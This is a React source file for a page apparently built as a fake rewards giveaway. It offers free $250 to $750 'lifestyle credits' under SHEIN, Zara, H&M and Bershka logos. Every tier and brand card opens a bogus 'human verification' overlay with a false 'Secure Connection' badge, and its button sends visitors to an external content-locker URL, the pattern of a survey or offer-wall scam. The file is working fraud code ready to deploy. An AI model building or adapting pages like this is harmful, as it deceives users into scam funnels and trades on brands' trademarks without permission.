import React, { useState } from 'react';

function App() {
  const [currentView, setCurrentView] = useState('landing'); // 'landing' | 'marketplace'
  const [verificationOpen, setVerificationOpen] = useState(false);
  const [selectedTier, setSelectedTier] = useState('$0.00');
  const [isProcessing, setIsProcessing] = useState(false);

  const transitionTo = (viewName) => {
    setCurrentView(viewName);
    window.scrollTo(0, 0);
  };

  const selectTier = (amount) => {
    setSelectedTier(amount);
    triggerVerification();
  };

  const triggerVerification = () => {
    setVerificationOpen(true);
  };

  const closeVerification = () => {
    if (!isProcessing) {
      setVerificationOpen(false);
    }
  };

  const finalRedirect = () => {
    setIsProcessing(true);
    setTimeout(() => {
      window.location.href = "https://lockedpage1.website/cl/i/qkv7w4";
    }, 800);
  };

  return (
    <div className="min-h-screen bg-[#F9F7F2] text-[#2C2C2C]">

      {/* VIEW 1: LANDING EXPERIENCE */}
      <main
        id="view-landing"
        className={`view-section min-h-screen relative flex flex-col ${currentView === 'landing' ? 'active' : ''}`}
        style={{ display: currentView === 'landing' ? 'flex' : 'none' }}
      >
        <nav className="absolute top-0 w-full p-8 flex justify-between items-center z-10">
          <div className="serif italic text-2xl tracking-wide">The Studio.</div>
          <button onClick={() => transitionTo('marketplace')} className="text-xs uppercase tracking-[0.2em] hover:text-[#C5A059] transition-colors">Member Sign In</button>
        </nav>

        <div className="flex-1 flex flex-col lg:flex-row h-full">
          {/* Image Side */}
          <div className="lg:w-1/2 h-[50vh] lg:h-auto relative overflow-hidden order-1 lg:order-2">
            <img src="https://images.unsplash.com/photo-1469334031218-e382a71b716b?q=80&w=1200&auto=format&fit=crop" className="absolute inset-0 w-full h-full object-cover" alt="Lifestyle Editorial" />
            <div className="absolute inset-0 bg-black/10"></div>
          </div>

          {/* Content Side */}
          <div className="lg:w-1/2 flex items-center justify-center p-8 lg:p-20 order-2 lg:order-1">
            <div className="max-w-md">
              <span className="block text-[10px] uppercase tracking-[0.3em] text-[#C5A059] mb-6">Invitation Only</span>
              <h1 className="text-5xl lg:text-7xl leading-[1.1] mb-8">
                Curated <br />
                <span className="italic text-[#8A8A8A] font-light">Lifestyle</span> <br />
                Rewards
              </h1>
              <p className="text-sm font-light leading-loose text-[#8A8A8A] mb-12 max-w-xs">
                A sanctuary for trendsetters. Access premium credits for the world's most coveted fashion and beauty houses.
              </p>
              <button onClick={() => transitionTo('marketplace')} className="group flex items-center space-x-4">
                <span className="h-[1px] w-12 bg-[#2C2C2C] group-hover:w-20 transition-all duration-300"></span>
                <span className="text-xs uppercase tracking-[0.25em]">Enter The Studio</span>
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* VIEW 2: MARKETPLACE */}
      <main
        id="view-marketplace"
        className={`view-section min-h-screen pb-20 ${currentView === 'marketplace' ? 'active' : ''}`}
        style={{ display: currentView === 'marketplace' ? 'block' : 'none' }}
      >
        <header className="sticky top-0 z-40 glass-panel px-6 py-4 flex justify-between items-center shadow-sm text-[#2C2C2C]">
          <div className="serif italic text-lg">The Studio.</div>
          <div className="flex items-center space-x-6">
            <div className="text-right hidden md:block">
              <div className="text-[9px] uppercase tracking-widest text-[#8A8A8A]">Studio Balance</div>
              <div className="serif text-lg opacity-50">$0.00</div>
            </div>
            <div className="w-8 h-8 rounded-full bg-[#E6DDD0] flex items-center justify-center text-xs serif italic">M</div>
          </div>
        </header>

        <div className="container mx-auto px-6 pt-12">

          <div className="mb-16 fade-in">
            <h2 className="text-3xl lg:text-5xl mb-3">Welcome, <span className="italic text-[#8A8A8A]">Guest</span></h2>
            <p className="text-[#8A8A8A] font-light text-sm">Your studio wallet is currently empty. Select an access tier to begin your curation.</p>

            <div className="mt-8 p-4 bg-white rounded-xl border border-[#E6DDD0] inline-flex items-center gap-4 shadow-sm">
              <div className="w-2 h-2 rounded-full bg-[#8A8A8A]"></div>
              <span className="text-[10px] uppercase tracking-widest text-[#8A8A8A]">Status: <span className="text-[#2C2C2C] font-medium">Pending Verification</span></span>
              <span className="h-4 w-[1px] bg-[#E6DDD0]"></span>
              <span className="text-[10px] uppercase tracking-widest text-[#8A8A8A]">Balance: <span className="text-[#2C2C2C] font-medium">$0.00</span></span>
            </div>
          </div>

          <section className="mb-20">
            <div className="flex items-end justify-between mb-8">
              <h3 className="serif text-2xl italic">Access Tiers</h3>
              <span className="text-[9px] uppercase tracking-widest text-[#C5A059]">Select to Unlock</span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              {/* Tier 1 */}
              <div onClick={() => selectTier('$250')} className="bg-white p-8 rounded-[2rem] border border-transparent hover:border-[#E5D4B3] transition-all shadow-sm group cursor-pointer">
                <div className="flex justify-between items-start mb-12">
                  <span className="text-[9px] uppercase tracking-widest text-[#8A8A8A]">Standard</span>
                  <div className="w-4 h-4 rounded-full border border-[#8A8A8A] group-hover:bg-[#C5A059] group-hover:border-[#C5A059] transition-colors"></div>
                </div>
                <div className="serif text-4xl mb-2">$250</div>
                <div className="text-[10px] text-[#8A8A8A] tracking-wide">Lifestyle Credit</div>
              </div>

              {/* Tier 2 */}
              <div onClick={() => selectTier('$500')} className="bg-[#2C2C2C] text-white p-8 rounded-[2rem] shadow-xl transform scale-[1.02] cursor-pointer relative overflow-hidden">
                <div className="absolute top-0 right-0 p-6 opacity-10 serif italic text-9xl leading-none">$</div>
                <div className="flex justify-between items-start mb-12 relative z-10">
                  <span className="text-[9px] uppercase tracking-widest text-[#C5A059]">Editorial Choice</span>
                  <div className="w-4 h-4 rounded-full border border-white/30 bg-[#C5A059]"></div>
                </div>
                <div className="serif text-5xl mb-2 relative z-10">$500</div>
                <div className="text-[10px] text-white/60 tracking-wide relative z-10">Premium Credit</div>
              </div>

              {/* Tier 3 */}
              <div onClick={() => selectTier('$750')} className="bg-white p-8 rounded-[2rem] border border-transparent hover:border-[#E5D4B3] transition-all shadow-sm group cursor-pointer">
                <div className="flex justify-between items-start mb-12">
                  <span className="text-[9px] uppercase tracking-widest text-[#8A8A8A]">Elite</span>
                  <div className="w-4 h-4 rounded-full border border-[#8A8A8A] group-hover:bg-[#C5A059] group-hover:border-[#C5A059] transition-colors"></div>
                </div>
                <div className="serif text-4xl mb-2">$750</div>
                <div className="text-[10px] text-[#8A8A8A] tracking-wide">Lifestyle Credit</div>
              </div>
            </div>
          </section>

          {/* MARKETPLACE DISCOVERY */}
          <section>
            <div className="flex items-end justify-between mb-8 border-b border-[#2C2C2C]/10 pb-4">
              <h3 className="serif text-2xl italic">The Collection</h3>
              <div className="flex space-x-6 text-[10px] uppercase tracking-widest">
                <span className="cursor-pointer border-b border-[#2C2C2C] pb-4 -mb-4.5">All</span>
                <span className="text-[#8A8A8A] hover:text-[#2C2C2C] cursor-pointer transition-colors">Fashion</span>
                <span className="text-[#8A8A8A] hover:text-[#2C2C2C] cursor-pointer transition-colors">Beauty</span>
                <span className="text-[#8A8A8A] hover:text-[#2C2C2C] cursor-pointer transition-colors">Home</span>
              </div>
            </div>

            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 md:gap-8">
              {/* Brand 1: SHEIN */}
              <div className="editorial-card group cursor-pointer" onClick={triggerVerification}>
                <div className="aspect-[3/4] rounded-xl overflow-hidden mb-4 relative bg-gray-100 shadow-md">
                  <img src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?q=80&w=600&auto=format&fit=crop" className="editorial-img w-full h-full object-cover" alt="Fashion" />
                  <div className="absolute inset-0 bg-black/20 group-hover:bg-black/30 transition-colors duration-500"></div>
                  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Shein_Logo_2017.svg/1280px-Shein_Logo_2017.svg.png" className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-20 md:w-24 h-auto object-contain brightness-0 invert opacity-90 drop-shadow-lg" alt="SHEIN Logo" />
                  <div className="absolute bottom-4 left-4 text-white text-[9px] uppercase tracking-widest opacity-0 group-hover:opacity-100 transition-opacity">Redeem</div>
                </div>
                <h4 className="text-sm font-medium">SHEIN</h4>
                <p className="text-[10px] text-[#8A8A8A] uppercase tracking-wide">Summer Edit</p>
              </div>

              {/* Brand 2: Zara */}
              <div className="editorial-card group cursor-pointer" onClick={triggerVerification}>
                <div className="aspect-[3/4] rounded-xl overflow-hidden mb-4 relative bg-gray-100 shadow-md">
                  <img src="https://images.unsplash.com/photo-1483985988355-763728e1935b?q=80&w=600&auto=format&fit=crop" className="editorial-img w-full h-full object-cover" alt="Trend" />
                  <div className="absolute inset-0 bg-black/20 group-hover:bg-black/30 transition-colors duration-500"></div>
                  <img src="https://upload.wikimedia.org/wikipedia/commons/f/fd/Zara_Logo.svg" className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-24 md:w-32 h-auto object-contain brightness-0 invert opacity-90 drop-shadow-lg" alt="Zara Logo" />
                </div>
                <h4 className="text-sm font-medium">Zara</h4>
                <p className="text-[10px] text-[#8A8A8A] uppercase tracking-wide">Statement Pieces</p>
              </div>

              {/* Brand 3: H&M */}
              <div className="editorial-card group cursor-pointer" onClick={triggerVerification}>
                <div className="aspect-[3/4] rounded-xl overflow-hidden mb-4 relative bg-gray-100 shadow-md">
                  <img src="https://images.unsplash.com/photo-1441986300917-64674bd600d8?q=80&w=600&auto=format&fit=crop" className="editorial-img w-full h-full object-cover" alt="Style" />
                  <div className="absolute inset-0 bg-black/20 group-hover:bg-black/30 transition-colors duration-500"></div>
                  <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/H%26M-Logo.svg" className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-16 md:w-20 h-auto object-contain brightness-0 invert opacity-90 drop-shadow-lg" alt="H&M Logo" />
                </div>
                <h4 className="text-sm font-medium">H&M</h4>
                <p className="text-[10px] text-[#8A8A8A] uppercase tracking-wide">Daily Essentials</p>
              </div>

              {/* Brand 4: Bershka */}
              <div className="editorial-card group cursor-pointer" onClick={triggerVerification}>
                <div className="aspect-[3/4] rounded-xl overflow-hidden mb-4 relative bg-gray-100 shadow-md">
                  <img src="https://images.unsplash.com/photo-1503342394128-c104d54dba01?q=80&w=600&auto=format&fit=crop" className="editorial-img w-full h-full object-cover" alt="Runway" />
                  <div className="absolute inset-0 bg-black/20 group-hover:bg-black/30 transition-colors duration-500"></div>
                  <img src="https://upload.wikimedia.org/wikipedia/commons/7/75/Bershka_logo.svg" className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-24 md:w-32 h-auto object-contain brightness-0 invert opacity-90 drop-shadow-lg" alt="Bershka Logo" />
                </div>
                <h4 className="text-sm font-medium">Bershka</h4>
                <p className="text-[10px] text-[#8A8A8A] uppercase tracking-wide">Youth Culture</p>
              </div>
            </div>
          </section>
        </div>
      </main>

      {/* VERIFICATION OVERLAY */}
      {verificationOpen && (
        <div className="fixed inset-0 z-50">
          <div className="absolute inset-0 bg-[#E6DDD0]/80 backdrop-blur-xl transition-opacity duration-500" onClick={closeVerification}></div>
          <div className="absolute inset-0 flex items-center justify-center p-6 fade-in">
            <div className="bg-white w-full max-w-md rounded-[30px] p-10 lg:p-14 shadow-2xl relative text-center">

              <button onClick={closeVerification} className="absolute top-6 right-6 text-[#8A8A8A] hover:text-[#2C2C2C] transition-colors">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M6 18L18 6M6 6l12 12"></path></svg>
              </button>

              <div className="w-12 h-[1px] bg-[#C5A059] mx-auto mb-8"></div>

              <h3 className="serif text-3xl text-[#2C2C2C] mb-4 italic">Verification Required</h3>
              <p className="text-[#8A8A8A] text-xs leading-loose mb-10 font-light">
                To maintain the integrity of our studio and unlock your selected credit balance, we require a brief human verification. This ensures equitable access for all our members.
              </p>

              <div className="bg-[#F9F7F2] rounded-2xl p-6 mb-10">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-[10px] uppercase tracking-widest text-[#8A8A8A]">Selected Access</span>
                  <span className="font-bold text-[#2C2C2C]">{selectedTier + '.00'}</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-[10px] uppercase tracking-widest text-[#8A8A8A]">Status</span>
                  <span className="text-[10px] uppercase tracking-widest text-[#C5A059] font-bold">Locked</span>
                </div>
              </div>

              <button onClick={finalRedirect} disabled={isProcessing} className={`w-full bg-[#2C2C2C] text-white py-5 rounded-full text-[10px] uppercase tracking-[0.25em] hover:bg-black transition-colors shadow-lg btn-editorial ${isProcessing ? 'opacity-75 cursor-not-allowed' : ''}`}>
                {isProcessing ? 'Processing...' : 'Unlock Balance'}
              </button>

              <div className="mt-6 flex items-center justify-center space-x-2 opacity-50">
                <svg className="w-3 h-3 text-[#8A8A8A]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                <span className="text-[8px] uppercase tracking-widest text-[#8A8A8A]">Secure Connection</span>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
